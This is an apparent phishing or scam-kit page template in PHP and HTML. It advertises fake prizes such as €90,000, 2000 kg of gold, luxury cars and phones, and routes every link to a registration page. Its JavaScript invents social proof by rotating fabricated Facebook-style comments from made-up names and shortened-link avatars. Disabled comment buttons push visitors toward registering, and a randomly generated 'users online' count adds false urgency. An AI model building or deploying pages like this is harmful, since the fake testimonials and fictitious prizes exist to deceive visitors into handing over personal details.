              <div class="col-sm-6"><a onclick="JavaScript:alert('You must register an account before commenting..')"><?php echo $komenmore_za;?></a></div>
              <div class="pull-right"><p><?php echo $komenangka_za;?></p></div>
              <hr class="fb_line">
              <div class="fb_plugin">
                <img src="/include/images/fav.png" class="fb_icon">
                <a href="#" class="fb_plugin_link"><?php echo $fbplugin_za;?></a>
              </div>
            </td>
          </tr>
        </tbody>

 </div>

    <div class="row">
                                                 
                          <br/> 
                          <center>
                      <br/>

<div class="btn btn-lg">
<a class="btn btn-primary btn-lg" target="_blank" href="/register.php"><i class="fa fa-comments"></i> <?php echo $komenleave_za;?></a>

</center>



  
    </div>
            </div><!-- col-md-12 -->    
            <div class="col-md-12">
                <div class="comments">
                  <ul>
                    
                  </ul>
                </div>
            </div><!-- col-md-12 -->
            <div class="col-md-12">
                   <ul> <div class="text"></div></ul>
            </div><!-- col-md-12 -->
    </div>

    <div class="col-md-3 col-xs-12">
      <div class="text-center h3" style="margin-top: 0;font-size: 18px;"><?php echo $liane_za;?></div>
                    <div class="col-md-12">
                <a href="/register.php" title="€ 90,000" class="text-center">
                  <img src="/include/images/Gambar2.png" alt="€ 90,000" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $fulus_za;?></span>
                </a>
              </div>
                            <div class="col-md-12">
                <a href="/register.php" title="2000 kg de oro" class="text-center">
                  <img src="/include/images/Gambar3.png" alt="2000 kg de oro" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $emas_za;?></span>
                </a>
              </div>
                            <div class="col-md-12">
                <a href="/register.php" title="Coche de lujo" class="text-center">
                  <img src="/include/images/Gambar4.png" alt="Coche de lujo" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $embem_za;?></span>
                </a>
              </div>
                            <div class="col-md-12">
                <a href="/register.php" title="Apartamentos de lujo" class="text-center">
                  <img src="/include/images/Gambar5.png" alt="Apartamentos de lujo" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $imah_za;?></span>
                </a>
              </div>
                            <div class="col-md-12">
                <a href="/register.php" class="text-center">
                  <img src="/include/images/Gambar6.png" alt="iPhone 11 Pro Max" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $ipon_za;?></span>
                </a>
              </div>
                            <div class="col-md-12">
                <a href="/register.php" title="Samsung Galaxy Fold" class="text-center">
                  <img src="/include/images/Gambar7.png" alt="Samsung Galaxy Fold" class="gird-pic img-responsive" style="height:105px;width:100%;">
                  <span style="font-size: 12px;background-color: rgba(0, 0, 0, 0.77);text-shadow: 1px 1px 1px #000;color: #FFF;padding: 5px;" class="nowrap"><?php echo $samsung_za;?></span>
                </a>
              </div>
                  </div>
  </div>
</div>   
<footer class="col-md-12" style="background:#b37700;padding: 20px;color: white;font-weight: bolder;text-shadow: 0px  0px 1px rgb(0, 0, 0);">
  <div class="container">
    <div class="col-sm-6"><?php echo $footer_za;?></div>
    <div class="col-sm-6">
      <button class="btn btn-default btn-sm pull-right" data-toggle="modal" data-target=".contact" style="Minute-width: 100px;"><?php echo $kontakaja_za;?></button>
    </div>
  </div>
</footer>

<script>
    var slideIndex = 0;
    showSlides();

    function showSlides() {
      var i;
      var slides = document.getElementsByClassName("mySlides");
      var dots = document.getElementsByClassName("dot");
      for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none";
      }
      slideIndex++;
      if (slideIndex > slides.length) {slideIndex = 1}
      for (i = 0; i < dots.length; i++) {
        dots[i].className = dots[i].className.replace(" active", "");
      }
      slides[slideIndex-1].style.display = "block";
      dots[slideIndex-1].className += " active";
      setTimeout(showSlides, 3000); // Change image every 2 seconds
    }
    </script>
    <script type="text/javascript">
      $ (document).ready(function(){

        setInterval(newActivity, 10000);

        function newActivity() {
          var prof = [    'https://bit.ly/2Z4PCvO',
                          'https://bit.ly/37i4oUL',
                          'https://bit.ly/3p50AMp',
                          'https://bit.ly/370ArrY',
                          'https://bit.ly/3q6PAiU',
                          'https://bit.ly/2Z6r8T3',
                          'https://bit.ly/3p3i8sd',
                          'https://bit.ly/3tI5Fhf',
                          'https://bit.ly/3rGgG0E',
                          'https://bit.ly/3p51317',
                          'https://bit.ly/2LAQPI6',
                          'https://bit.ly/3tJFk2q',
                          'https://bit.ly/3a71xQd',
                          'https://bit.ly/3jzhTnR'];

          var comm = ['<?php echo $acak1_za;?>','<?php echo $acak2_za;?>','<?php echo $acak3_za;?>','<?php echo $acak4_za;?>',
                      '<?php echo $acak5_za;?>','<?php echo $acak6_za;?>','<?php echo $acak7_za;?>','<?php echo $acak8_za;?>',
                      '<?php echo $acak9_za;?>','<?php echo $acak10_za;?>','<?php echo $acak11_za;?>','<?php echo $acak12_za;?>',
                      '<?php echo $acak13_za;?> ','<?php echo $acak14_za;?>'];

          var user = ['Eric Wenger','Brian La Framboise', 'Jeannie Elmore','Steven Seward','Tosha Morgan Wilson','Seth Samuel Williams','Rick LapLante','Patricia Jenkins Dye','Jenna Salvini','Paul Espinoza','Kristin Alvarez','Ron Höegen', 'Jim Wilson','Cheryl Dumont'];

          var pic = [ 'https://bit.ly/2Ni7dxB',
                      'https://bit.ly/3jy0c88',
                      'https://bit.ly/2NeVLCS',
                      'https://bit.ly/3a4gtyv',
                      'https://bit.ly/3tOvz38',
                      'https://bit.ly/373qgTE',
                      'https://bit.ly/2Z1hvFf',
                      'https://bit.ly/3jAI8tS',
                      'https://bit.ly/3qcQWJc',
                      'https://bit.ly/3q92Pzv'];

          var profs = prof[Math.floor(Math.random()*prof.length)];
          var comms = comm[Math.floor(Math.random()*comm.length)];
          var pics = pic[Math.floor(Math.random()*pic.length)];
          var users = user[Math.floor(Math.random()*user.length)];

          $('.fb_comment_wrapper').last().remove();
          $('.activityContent').hide().prepend('<div class="fb_comment_wrapper">'+
          '<div class="fb_image_block"><img src="'+profs+'" class="fb_pic"/></div>'+
        '<div class="fb_comment_block"><div class="fb_name">'+users+'</div><div class="fb_comment">'
        +comms+'<img src="'+pics+
        '" class="img-responsive img_comment"></div></div><div class="fb_meta"><a onclick="JavaScript:alert("You must create an account before commenting."")" class="fb_like fb_meta_item"><?php echo $suka_za;?></a> •<a onclick="JavaScript:alert("You must create an account before commenting.")" class="fb_like fb_meta_item"><?php echo $balasan_za;?></a> •<img class="fb_like_button fb_meta_item" src="/include/images/like.png"><span class="like_count fb_meta_item">20</span> •<span class="fb_timestamp"><div class="fb_image_block">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div><?php echo $acak15_za;?></span></div></div>').fadeIn();
        }
      });

    </script>
    <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju-2.js" type="text/javascript"></script>
<div class="modal fade contact" tabindex="-1" role="dialog" aria-labelledby="contact" aria-hidden="true">
  <div class="modal-dialog">
    <div class="panel panel-primary">
      <div class="panel-heading">
        <h3 class="panel-title text-center"><?php echo $kontakaja_za;?> <button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button></h3>
      </div>
      <div class="panel-body">
       
        <form action="" method="POST" role="form" enctype="multipart/form-data">
          <div class="form-group">
            <label for=""><?php echo $kontaknama_za;?></label>
            <input name="name" required="" type="text" class="form-control" id="name" placeholder="<?php echo $kontaknama1_za;?>">
          </div>
          <div class="form-group">
            <label for=""><?php echo $kontakmail_za;?></label>
            <input name="email" required="" type="email" class="form-control" id="email" placeholder="<?php echo $kontakmail1_za;?>">
          </div>
          <div class="form-group">
            <label for=""><?php echo $kontakpesan_za;?></label>
            <textarea name="message" required="" class="form-control" id="message" placeholder="<?php echo $kontakpesan1_za;?>" style="resize: none;"></textarea>
          </div>
                                                <input type="hidden" name="contact" value="submit">
            <button id="submitcontact" type="submit" class="btn btn-primary pull-right"><?php echo $kontaktekan_za;?></button>
        </form>
         
      </div>
    </div>
  </div>
</div>

<script type="text/javascript" src="/include/js/scripts.js"></script>
<script type="text/javascript" src="/include/js/screenfull.min.js"></script>

<div class="online">
        <span class="online-icon"></span>
        <div class="online-text">
                <?php
                        $onlineNumber = range(1000, 5000);
                        $online = $onlineNumber[array_rand($onlineNumber)];

                        echo '<p>' . $online . ' Online</p>';
                 ?>
        </div>
</div>
<?php require_once($_SERVER['DOCUMENT_ROOT'] .'/histats.php'); ?>
</body>
<!-- Histats.com  START  (aync)-->
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4311870,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4311870&101" alt="web counter" border="0"></a></noscript>
<!-- Histats.com  END  -->

</html>